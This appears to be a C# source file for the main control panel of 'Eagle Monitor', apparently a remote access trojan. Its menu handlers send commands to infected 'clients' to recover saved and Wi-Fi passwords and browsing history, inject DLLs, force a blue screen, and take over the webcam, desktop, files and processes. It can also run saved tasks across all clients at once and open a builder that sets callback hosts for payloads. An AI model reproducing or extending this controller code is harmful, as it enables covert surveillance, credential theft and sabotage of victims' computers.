using Eagle_Monitor.Clients;
using Eagle_Monitor.Controls;
using Eagle_Monitor.Forms;
using Eagle_Monitor.Helpers;
using Microsoft.VisualBasic;
using Newtonsoft.Json;
using Shared;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor
{
    public partial class Main : FormPattern
    {
        public Main()
        {
            InitializeComponent();
        }

        //private MetroDropShadow metroDropShadow;
        public static BuilderForm B = new BuilderForm();
        public static AboutForm A = new AboutForm();


        [DllImport("uxtheme", CharSet = CharSet.Unicode)]
        public extern static int SetWindowTheme(IntPtr hWnd, string textSubAppName, string textSubIdList);



        private void Main_Load(object sender, EventArgs e)
        {
            //SetWindowTheme(clientsListView.Handle, "explorer", null);
            ControlsDrawing.FixControls();
            testNewFeaturesToolStripMenuItem.Visible = false;//Test new features or plugins;

            Utilities.AnimateWindow(this.Handle, 500, Utilities.dwFlags.AW_BLEND);
            //metroDropShadow = new MetroDropShadow(this); involves high cpu usage sometimes
            ControlsDrawing.Enable(clientsListView);
            ControlsDrawing.Enable(tasksListView);
            ControlsDrawing.Enable(massListView);
            ControlsDrawing.Enable(windowsTabControls1);
            ControlsDrawing.Enable(clientMenuStrip);
            ControlsDrawing.Enable(tasksContextMenuStrip);
            ControlsDrawing.Enable(label2);

            //SetWindowTheme(clientsListView.Handle, "explorer", null);

            new Thread(() => 
            {
                while (true)
                {
                    label2.Location = new System.Drawing.Point(label2.Location.X + 1, this.Height - label2.Height - 9);
                    Thread.Sleep(50);
                    if (label2.Location.X == windowsTabControls1.Location.X + windowsTabControls1.Size.Width)
                        label2.Location = new System.Drawing.Point(7, this.Height - label2.Height - 9);
                }
            }).Start();

            if (System.IO.File.Exists(Utilities.GPath + "\\Settings.ini"))
            {
                string[] L = System.IO.File.ReadAllLines(Utilities.GPath + "\\Settings.ini");

                for (int i = 0; i <= (L.Length - 1); i++)
                {
                    switch (L[i]) 
                    {
                        case "PassRecovery":
                            ListViewItem Task = new ListViewItem("Passwords Recovery");
                            Task.SubItems.Add("NONE");
                            Task.Name = "PassRecovery";
                            tasksListView.Items.Add(Task);
                            break;

                        case "WifiRecovery":
                            Task = new ListViewItem("Wifi Passwords Recovery");
                            Task.SubItems.Add("NONE");
                            Task.Name = "WifiRecovery";
                            tasksListView.Items.Add(Task);
                            break;

                        case "BSOD":
                            Task = new ListViewItem("BSOD");
                            Task.SubItems.Add("NONE");
                            Task.Name = "BSOD";
                            tasksListView.Items.Add(Task);
                            break;
                    }

                    if (L[i].Contains("Unmanaged")) 
                    {
                        string[] S = Microsoft.VisualBasic.Strings.Split(L[i], "||");
                        ListViewItem Task = new ListViewItem(S[0]);
                        Task.SubItems.Add(S[1]);
                        Task.Name = Utilities.SplitPath(S[1]) + "Unmanaged";
                        tasksListView.Items.Add(Task);
                    }
                    if (L[i].Contains("Managed"))
                    {
                        string[] S = Microsoft.VisualBasic.Strings.Split(L[i], "||");
                        ListViewItem Task = new ListViewItem(S[0]);
                        Task.SubItems.Add(S[1] + "||" + S[2]);
                        Task.Name = Utilities.SplitPath(S[1]) + "Managed";
                        tasksListView.Items.Add(Task);
                    }
                }
            }
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            List<string> L = new List<string>();
            foreach (ListViewItem I in logsListView.Items)
            {
                L.Add(I.Text);
            }
            System.IO.File.WriteAllLines(Utilities.GPath + "\\Logs.ini", L.ToArray());
            Utilities.NtTerminateProcess(Process.GetCurrentProcess().Handle, 0);
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void Main_ResizeBegin(object sender, EventArgs e)
        {
            ControlsDrawing.FixControls();
        }

        private void Main_ResizeEnd(object sender, EventArgs e)
        {
            ControlsDrawing.FixControls();
        }

        private void Main_Resize(object sender, EventArgs e)
        {
            ControlsDrawing.FixControls();
        }

        private void Main_SizeChanged(object sender, EventArgs e)
        {
            ControlsDrawing.FixControls();
        }

        private void passwordsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new SenderClient.DataSender(SenderClient.RecoveryPasswords).Invoke();
        }
        private void historyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new SenderClient.DataSender(SenderClient.RecoveryHistory).Invoke();
        }

        private void wifiToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new SenderClient.DataSender(SenderClient.RecoveryWifiPasswords).Invoke();
        }

        private void processManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new SenderClient.DataSender(SenderClient.ProcessManager).Invoke();
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new SenderClient.DataSender(SenderClient.FileManager).Invoke();
        }

        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new SenderClient.DataSender(SenderClient.RemoteDesktop).Invoke();
        }

        private void injectionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new SenderClient.DataSender(SenderClient.Injection).Invoke();
        }

        private void panelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new SenderClient.DataSender(SenderClient.Panel).Invoke();
        }

        private void webCamToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new SenderClient.DataSender(SenderClient.WebCam).Invoke();
        }

        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new SenderClient.DataSender(SenderClient.CloseClient).Invoke();
        }

        private void uninstallTaskSchedulerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new SenderClient.DataSender(SenderClient.UninstallTaskSchClient).Invoke();
        }

        private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new SenderClient.DataSender(SenderClient.ShutdownClientComputer).Invoke();
        }
        private void rebootToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new SenderClient.DataSender(SenderClient.RebootClientComputer).Invoke();
        }

        private void logoutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new SenderClient.DataSender(SenderClient.LogoutClientComputer).Invoke();
        }

        private void suspendToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new SenderClient.DataSender(SenderClient.SuspendClientComputer).Invoke();
        }

        private void hibernateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new SenderClient.DataSender(SenderClient.HibernateClientComputer).Invoke();
        }

        private void computerInformationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new SenderClient.DataSender(SenderClient.ComputerInformation).Invoke();
        }

        private void algoComboBox_SelectedIndexChanged(object sender, EventArgs e)
        {
            keySizeComboBox.Items.Clear();

            switch (algoComboBox.SelectedIndex)
            {

                //BlowfishEngine : Any Size  32 to 448
                //Cast5Engine : 128 bits key
                //Cast6Engine : 256 bit key
                //DesEdeEngine : 16 or 24
                //DesEngine : ANy size 
                //Dstu7624Engine : 128,256,512
                //Gost28147Engine 32 or256 bits key
                //IdeaEngine : Any Size
                //NoekeonEngine : Any Size
                //RC2 : Any Size
                //RC532Engine : Any Size
                //RC6Engine : Any 
                //RijndaelEngine : 128 or 160 or 192 or 224 or 256
                //SeedEngine : Any Size
                //SerpentEngine : 128, 192 or 256 bits
                //SkipjackEngine : Any Size
                //SM4Engine : 128 bits size
                //TeaEngine : Any Size
                //ThreefishEngine : 256, 512 or 1024
                //TnepresEngine : 128, 192 and 256
                //TwofishEngine : 256 bit key 128, 192 or 256
                //XteaEngine : Any Size '8-bit to 8288-

                //Chacha : 256 length + IV of 8
                //ChaCha7539Engine : 256 length + IV of 12

                //VmpcEngine : 128 to 512 bits IV : max 256 ?
                //RC4Engine : ANy Size ?
                //VmpcKsa3Engine : Any Size ? + IV : max 256 ?
                //HC256Engine  : 128/256 bit key and an IV at least 128 (max : 256 bits) : https://en.wikipedia.org/wiki/HC-256
                //Salsa20Engine : IV 8 bits key 128 or 256 + round (even nb)
                //XSalsa20Engine :  IV 24 bits key 256 bits

                case 0: //Blowfish
                    keySizeComboBox.Items.Add("32-448");
                    break;

                case 1: //Cast5
                    keySizeComboBox.Items.Add("128");
                    break;

                case 2: //Cast6
                    keySizeComboBox.Items.Add("256");
                    break;

                case 3: //DesEde
                    keySizeComboBox.Items.Add("16");
                    keySizeComboBox.Items.Add("24");
                    break;

                case 4: //Des
                    keySizeComboBox.Items.Add("Any");
                    break;

                case 5: //Dstu7624
                    keySizeComboBox.Items.Add("128");
                    keySizeComboBox.Items.Add("256");
                    keySizeComboBox.Items.Add("512");
                    break;

                case 6: //Gost28147
                    keySizeComboBox.Items.Add("32");
                    keySizeComboBox.Items.Add("256");
                    break;

                case 7: //Idea
                    keySizeComboBox.Items.Add("Any");
                    break;

                case 8: //Noekeon
                    keySizeComboBox.Items.Add("Any");
                    break;

                case 9: //RC2
                    keySizeComboBox.Items.Add("Any");
                    break;

                case 10: //RC532
                    keySizeComboBox.Items.Add("Any");
                    break;

                case 11: //RC6
                    keySizeComboBox.Items.Add("Any");
                    break;

                case 12: //Rijndael
                    keySizeComboBox.Items.Add("128");
                    keySizeComboBox.Items.Add("160");
                    keySizeComboBox.Items.Add("192");
                    keySizeComboBox.Items.Add("224");
                    keySizeComboBox.Items.Add("256");
                    break;

                case 13: //Seed
                    keySizeComboBox.Items.Add("Any");
                    break;

                case 14: //Serpent
                    keySizeComboBox.Items.Add("128");
                    keySizeComboBox.Items.Add("192");
                    keySizeComboBox.Items.Add("256");
                    break;

                case 15: //Skipjack
                    keySizeComboBox.Items.Add("Any");
                    break;

                case 16: //SM4
                    MessageBox.Show("Bugs client side ! Don't use it currently !");
                    keySizeComboBox.Items.Add("128");
                    break;

                case 17: //Tea
                    keySizeComboBox.Items.Add("Any");
                    break;

                case 18: //Threefish
                    keySizeComboBox.Items.Add("256");
                    keySizeComboBox.Items.Add("512");
                    keySizeComboBox.Items.Add("1024");
                    break;

                case 19: //Tnepres
                    keySizeComboBox.Items.Add("128");
                    keySizeComboBox.Items.Add("192");
                    keySizeComboBox.Items.Add("256");
                    break;

                case 20: //Twofish
                    keySizeComboBox.Items.Add("128");
                    keySizeComboBox.Items.Add("192");
                    keySizeComboBox.Items.Add("256");
                    break;

                case 21: //Xtea
                    keySizeComboBox.Items.Add("Any");
                    break;

                case 22: //Chacha
                    keySizeComboBox.Items.Add("256");
                    break;

                case 23: //Chacha7539
                    keySizeComboBox.Items.Add("256");
                    break;

                case 24: //Salsa20
                    keySizeComboBox.Items.Add("128");
                    keySizeComboBox.Items.Add("256");
                    break;

                case 25: //XSalsa20
                    keySizeComboBox.Items.Add("256");
                    break;

                case 26: // Vmpc
                    keySizeComboBox.Items.Add("128-512");
                    break;

                case 27: // RC4
                    keySizeComboBox.Items.Add("40-2048");
                    break;

                case 28: // VmpcKsa3
                    keySizeComboBox.Items.Add("128-512");
                    break;

                case 29: // HC256
                    keySizeComboBox.Items.Add("128");
                    keySizeComboBox.Items.Add("256");
                    break;

                case 30: //Isaac
                    keySizeComboBox.Items.Add("8-2048");
                    break;
            }
            Utilities.algorithm = (Algorithm)algoComboBox.SelectedIndex;
        }

        private void generateKeyButton_Click(object sender, EventArgs e)
        {
            try
            {

                Random randomGenerator = new Random();
                List<byte> RES = new List<byte>();
                StringBuilder S = new StringBuilder();

                for (var i = 0; i <= 450; i++)
                {
                    S.Append(Utilities.randomString[randomGenerator.Next(0, Utilities.randomString.Length)]);
                }

                switch (keySizeComboBox.SelectedItem)
                {
                    case "Any":
                        int tempVar = 32 + randomGenerator.Next(0, 128) - 1;
                        for (var i = 0; i <= tempVar; i++)
                        {
                            RES.Add(Convert.ToByte(S.ToString()[i]));
                        }
                        keyTextBox.Text = Encoding.Default.GetString(RES.ToArray());
                        break;

                    case "32-448":
                        int tempVar2 = (randomGenerator.Next(32, 448) - 1) / 8;
                        for (var i = 0; i <= tempVar2; i++)
                        {
                            RES.Add(Convert.ToByte(S.ToString()[i]));
                        }
                        keyTextBox.Text = Encoding.Default.GetString(RES.ToArray());
                        break;

                    case "128-512":
                        int tempVar3 = (randomGenerator.Next(128, 512) - 1) / 8;
                        for (var i = 0; i <= tempVar3; i++)
                        {
                            RES.Add(Convert.ToByte(S.ToString()[i]));
                        }
                        keyTextBox.Text = Encoding.Default.GetString(RES.ToArray());
                        break;

                    case "40-2048":
                        int tempVar4 = (randomGenerator.Next(40, 2048) - 1) / 8;
                        for (var i = 0; i <= tempVar4; i++)
                        {
                            RES.Add(Convert.ToByte(S.ToString()[i]));
                        }
                        keyTextBox.Text = Encoding.Default.GetString(RES.ToArray());
                        break;

                    case "8-2048": 
                        int tempVar5 = (randomGenerator.Next(8, 2048) - 1) / 8;
                        for (var i = 0; i <= tempVar5; i++)
                        {
                            RES.Add(Convert.ToByte(S.ToString()[i]));
                        }
                        keyTextBox.Text = Encoding.Default.GetString(RES.ToArray());
                        break;

                    default:
                        int tempVar6 = (int.Parse(keySizeComboBox.SelectedItem.ToString()) - 1) / 8;
                        for (var i = 0; i <= tempVar6; i++)
                        {
                            RES.Add(Convert.ToByte(S.ToString()[i]));
                        }
                        keyTextBox.Text = Encoding.Default.GetString(RES.ToArray());
                        break;
                }

                Utilities.key = Encoding.Default.GetString(RES.ToArray());
                Utilities.settings.encryptionFileManagerKey = Utilities.key;
                Utilities.settings.encryptionFileManagerKeySize = keySizeComboBox.SelectedItem.ToString();
                Utilities.settings.algorithm = (Algorithm)(algoComboBox.SelectedIndex);
                string savedSettings = JsonConvert.SerializeObject(Utilities.settings);
                File.WriteAllText(Utilities.GPath + "\\config.json", savedSettings);

            }
            catch {}
        }   

        private void passwordsRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //Utilities.TaskToAdd("PassRecovery", new List<string> { "Passwords Recovery"  , "NONE" });
            if (tasksListView.Items["PassRecovery"] == null)
            {
                ListViewItem Task = new ListViewItem("Passwords Recovery");
                Task.SubItems.Add("NONE");
                Task.Name = "PassRecovery";
                tasksListView.Items.Add(Task);
            }
        }

        private void wifiPasswordsRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (tasksListView.Items["WifiRecovery"] == null)
            {
                ListViewItem Task = new ListViewItem("Wifi Passwords Recovery");
                Task.SubItems.Add("NONE");
                Task.Name = "WifiRecovery";
                tasksListView.Items.Add(Task);
            }
        }

        private void dllInjectionManagedToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog O = new OpenFileDialog())
            {
                if (O.ShowDialog() == DialogResult.OK)
                {
                    string etp = Interaction.InputBox("Insert the entrypoint of your dll : [Namespace.Class.Function]");
                    ListViewItem Task = new ListViewItem("Dll Innjection [Managed]");
                    Task.SubItems.Add(O.FileName + "||" + etp);
                    Task.Name = Utilities.SplitPath(O.FileName) + "Managed";
                    tasksListView.Items.Add(Task);
                }
            }
        }

        private void dllInjectionUnmanagedToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog O = new OpenFileDialog())
            {
                if (O.ShowDialog() == DialogResult.OK)
                {
                    ListViewItem Task = new ListViewItem("Dll Innjection [Unmanaged]");
                    Task.SubItems.Add(O.FileName);
                    Task.Name = Utilities.SplitPath(O.FileName) + "Unmanaged";
                    tasksListView.Items.Add(Task);
                }
            }
        }

        private void bSODToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (tasksListView.Items["BSOD"] == null)
            {
                ListViewItem Task = new ListViewItem("BSOD");
                Task.SubItems.Add("NONE");
                Task.Name = "BSOD";
                tasksListView.Items.Add(Task);
            }
        }

        private void removeTaskToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (tasksListView.Items.Count > 0)
            {
                foreach (ListViewItem I in tasksListView.SelectedItems)
                    I.Remove();
            }
        }

        private void saveTasksToolStripMenuItem_Click(object sender, EventArgs e)
        {
            List<string> L = new List<string>();
            foreach (ListViewItem I in tasksListView.Items)
            {
                if (I.Name == "PassRecovery")
                {
                    L.Add("PassRecovery");
                }

                if (I.Name == "WifiRecovery")
                {
                    L.Add("WifiRecovery");
                }

                if (I.Name.EndsWith("Unmanaged"))
                {
                    L.Add(I.Text + "||" + I.SubItems[1].Text);
                }

                if (I.Name.EndsWith("Managed"))
                {
                    L.Add(I.Text + "||" + I.SubItems[1].Text);
                }

                if (I.Name == "BSOD")
                {
                    L.Add("BSOD");
                }

            }
            System.IO.File.WriteAllLines(Utilities.GPath + "\\Settings.ini", L.ToArray());
            MessageBox.Show("Saved Tasks !", "", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void builderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Main.B.Show();
                for (int i = 0; i < BuilderHelper.builderSetting.hostBuilder.Count; i++)
                {
                    ListViewItem I = new ListViewItem(BuilderHelper.builderSetting.hostBuilder[i]);
                    I.SubItems.Add(BuilderHelper.builderSetting.hostPortBuilder[i].ToString());
                    B.hostsListView.Items.Add(I);
                }
            }
            catch (Exception)
            {
                Main.B = new BuilderForm(); Main.B.Show();

                for (int i = 0; i < BuilderHelper.builderSetting.hostBuilder.Count; i++) 
                {
                    ListViewItem I = new ListViewItem(BuilderHelper.builderSetting.hostBuilder[i]);
                    I.SubItems.Add(BuilderHelper.builderSetting.hostPortBuilder[i].ToString());
                    B.hostsListView.Items.Add(I);
                }
            }
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Main.A.Show();
            }
            catch (Exception)
            {
                Main.A = new AboutForm(); Main.A.Show();
            }
        }

        private void passwordsMassRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (massListView.Items["PassRecovery"] == null)
            {
                ListViewItem Task = new ListViewItem("Passwords Recovery");
                Task.SubItems.Add("NONE");
                Task.Name = "PassRecovery";
                massListView.Items.Add(Task);
            }
        }

        private void wifiPasswordsRecoveryMassToolStripMenuItem_Click_Click(object sender, EventArgs e)
        {
            if (massListView.Items["WifiRecovery"] == null)
            {
                ListViewItem Task = new ListViewItem("Wifi Passwords Recovery");
                Task.SubItems.Add("NONE");
                Task.Name = "WifiRecovery";
                massListView.Items.Add(Task);
            }
        }

        private void dllInjectionManagedMassToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog O = new OpenFileDialog())
            {
                if (O.ShowDialog() == DialogResult.OK)
                {
                    string etp = Interaction.InputBox("Insert the entrypoint of your dll : [Namespace.Class.Function]");
                    ListViewItem Task = new ListViewItem("Dll Innjection [Managed]");
                    Task.SubItems.Add(O.FileName + "||" + etp);
                    Task.Name = Utilities.SplitPath(O.FileName) + "Managed";
                    massListView.Items.Add(Task);
                }
            }
        }

        private void dllInjectionUnmanagedMassToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog O = new OpenFileDialog())
            {
                if (O.ShowDialog() == DialogResult.OK)
                {
                    ListViewItem Task = new ListViewItem("Dll Innjection [Unmanaged]");
                    Task.SubItems.Add(O.FileName);
                    Task.Name = Utilities.SplitPath(O.FileName) + "Unmanaged";
                    massListView.Items.Add(Task);
                }
            }
        }

        private void bSODMassToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (massListView.Items["BSOD"] == null)
            {
                ListViewItem Task = new ListViewItem("BSOD");
                Task.SubItems.Add("NONE");
                Task.Name = "BSOD";
                massListView.Items.Add(Task);
            }
        }

        private void removeTaskMassToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (massListView.Items.Count > 0)
            {
                foreach (ListViewItem I in massListView.SelectedItems)
                    I.Remove();
            }
        }

        private void launchToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client C in Client.ClientDictionary.Values)
            {
                Task.Run(() => Client.TasksLauncher(C, massListView));
            }
        }

        //Test for new plugin or new feature
        private void test1ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem I in clientsListView.SelectedItems)
            {
                Client C = Client.ClientDictionary[I.SubItems[1].Text];
                Data D = new Data();
                D.Type = Shared.PacketType.PLUGIN;
                D.Plugin = Plugins.Miscellaneous;
                D.IP_Origin = C.IP;
                D.HWID = C.HWID;
                D.DataReturn = new object[] { Shared.PacketType.MS_OFF };
                Task.Run(() => C.SendData(D.Serialize()));
            }
        }

        private void test2ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem I in clientsListView.SelectedItems)
            {
                Client C = Client.ClientDictionary[I.SubItems[1].Text];
                Data D = new Data();
                D.Type = Shared.PacketType.PLUGIN;
                D.Plugin = Plugins.Miscellaneous;
                D.IP_Origin = C.IP;
                D.HWID = C.HWID;
                D.DataReturn = new object[] { Shared.PacketType.MS_ON };
                Task.Run(() => C.SendData(D.Serialize()));
            }
        }


    }
}
